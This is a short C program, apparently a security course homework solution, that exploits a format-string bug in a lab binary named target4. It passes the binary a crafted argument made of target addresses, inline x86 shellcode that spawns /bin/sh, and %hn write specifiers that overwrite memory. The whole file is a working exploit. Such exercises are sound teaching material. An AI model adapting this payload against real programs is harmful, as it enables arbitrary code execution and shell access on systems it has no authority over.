#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/home/user/hw2/targets/target4"

int main(void)
{
  char buf[400];
  memcpy(buf, "\x12\xfe\xff\xbf\x10\xfe\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80%49118d%1$hn%15493d%2$hn", 400);
  char *args[] = { TARGET, buf, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
